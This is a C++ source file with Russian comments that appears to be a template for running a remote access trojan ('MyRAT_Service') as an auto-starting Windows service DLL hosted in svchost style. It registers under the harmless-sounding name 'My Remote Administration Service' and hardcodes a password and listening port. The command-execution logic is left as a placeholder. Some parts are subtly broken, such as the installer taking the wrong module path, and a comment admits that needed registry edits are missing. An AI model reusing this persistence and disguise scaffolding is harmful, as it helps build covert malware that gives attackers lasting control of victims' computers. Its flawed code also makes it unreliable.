// remote_control_server.cpp - ПОЛНАЯ ВЕРСИЯ ДЛЯ СЛУЖБЫ
#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define NOMINMAX

#include <windows.h>
#include <objidl.h>
#include <gdiplus.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#include <mferror.h>
#include <shlobj.h>
#include <shellapi.h>
#include <string>
#include <thread>
#include <vector>
#include <atomic>
#include <cstdio>
#include <cstdlib>
#include <fstream>
#include <sstream>
#include <algorithm>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "mf.lib")
#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mfreadwrite.lib")
#pragma comment(lib, "mfuuid.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

using namespace Gdiplus;

#define PORT      9000
#define PASSWORD  "secret123"
#define BUF_MAX   16777216

// ══════════════════════════════════════════════════
// Глобальные переменные для службы
// ══════════════════════════════════════════════════
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
std::atomic<bool> g_StopService(false);

// ══════════════════════════════════════════════════
// ВАША ОСНОВНАЯ ФУНКЦИЯ СЕРВЕРА (перенесите сюда весь ваш код)
// ══════════════════════════════════════════════════
DWORD WINAPI RunRATServer(LPVOID lpParam) {
    // ██████████████████████████████████████████████████████████████████████
    // █  СЮДА ПЕРЕНЕСИТЕ ВЕСЬ ВАШ СУЩЕСТВУЮЩИЙ КОД ИЗ main()              █
    // █  (Инициализация Winsock, GDI+, Media Foundation, сокет-сервер и т.д.) █
    // ██████████████████████████████████████████████████████████████████████
    
    // ПРИМЕР: ваша логика сервера
    // ----------------------------------------------
    // Инициализация Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        // Логирование ошибки в файл
        return 1;
    }
    
    // Создание сокета
    SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (listenSocket == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }
    
    // Привязка к порту
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(PORT);
    
    if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }
    
    // Прослушивание
    listen(listenSocket, SOMAXCONN);
    
    // Основной цикл сервера
    while (!g_StopService) {
        fd_set readSet;
        FD_ZERO(&readSet);
        FD_SET(listenSocket, &readSet);
        
        timeval timeout;
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        
        int selectResult = select(0, &readSet, NULL, NULL, &timeout);
        if (selectResult > 0 && FD_ISSET(listenSocket, &readSet)) {
            // Принимаем подключение
            SOCKET clientSocket = accept(listenSocket, NULL, NULL);
            if (clientSocket != INVALID_SOCKET) {
                // Здесь ваша логика обработки клиента
                // (аутентификация по PASSWORD, выполнение команд и т.д.)
                closesocket(clientSocket);
            }
        }
    }
    
    // Очистка
    closesocket(listenSocket);
    WSACleanup();
    
    // ----------------------------------------------
    // КОНЕЦ ВАШЕГО КОДА
    // ----------------------------------------------
    
    return 0;
}

// ══════════════════════════════════════════════════
// Обработчик команд службы (остановка, пауза и т.д.)
// ══════════════════════════════════════════════════
VOID WINAPI ServiceCtrlHandler(DWORD dwCtrl) {
    switch (dwCtrl) {
        case SERVICE_CONTROL_STOP:
            g_StopService = true;
            SERVICE_STATUS status = {
                SERVICE_WIN32_SHARE_PROCESS,
                SERVICE_STOP_PENDING,
                0,
                NO_ERROR,
                0,
                0,
                0
            };
            SetServiceStatus(g_StatusHandle, &status);
            
            // Ждём завершения серверного потока (максимум 30 секунд)
            // Здесь нужно дождаться завершения CreateThread из ServiceMain
            Sleep(30000);
            
            status.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(g_StatusHandle, &status);
            break;
            
        default:
            break;
    }
}

// ══════════════════════════════════════════════════
// Экспортируемая функция ServiceMain (точка входа службы)
// ══════════════════════════════════════════════════
extern "C" __declspec(dllexport) VOID WINAPI ServiceMain(DWORD dwArgc, LPWSTR *lpszArgv) {
    // Регистрируем обработчик команд
    SERVICE_STATUS status = {
        SERVICE_WIN32_SHARE_PROCESS,
        SERVICE_START_PENDING,
        0,
        NO_ERROR,
        0,
        0,
        0
    };
    
    g_StatusHandle = RegisterServiceCtrlHandlerW(L"MyRAT_Service", ServiceCtrlHandler);
    if (!g_StatusHandle) {
        return;
    }
    
    SetServiceStatus(g_StatusHandle, &status);
    
    // Создаём поток с вашим сервером
    HANDLE hThread = CreateThread(NULL, 0, RunRATServer, NULL, 0, NULL);
    if (!hThread) {
        status.dwCurrentState = SERVICE_STOPPED;
        status.dwWin32ExitCode = GetLastError();
        SetServiceStatus(g_StatusHandle, &status);
        return;
    }
    
    CloseHandle(hThread); // Нам не нужно ждать завершения
    
    // Сообщаем системе, что служба запущена
    status.dwCurrentState = SERVICE_RUNNING;
    status.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    SetServiceStatus(g_StatusHandle, &status);
}

// ══════════════════════════════════════════════════
// Функция установки службы (запускается один раз)
// ══════════════════════════════════════════════════
void InstallService() {
    char dllPath[MAX_PATH];
    GetModuleFileNameA(NULL, dllPath, MAX_PATH);
    
    // Открываем сервисный менеджер
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) return;
    
    // Создаём сервис
    SC_HANDLE service = CreateServiceA(
        scm,
        "MyRAT_Service",
        "My Remote Administration Service",
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_SHARE_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        dllPath,
        NULL, NULL, NULL, NULL, NULL
    );
    
    if (service) {
        // Указываем, что сервис экспортирует функцию ServiceMain
        // (Это упрощённо, реально нужны правки реестра для svchost)
        CloseServiceHandle(service);
    }
    
    CloseServiceHandle(scm);
}

// ══════════════════════════════════════════════════
// Точка входа DLL (заменяет main)
// ══════════════════════════════════════════════════
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // Для службы - ничего не делаем, ServiceMain будет вызвана системой
            break;
        case DLL_PROCESS_DETACH:
            g_StopService = true;
            break;
    }
    return TRUE;
}
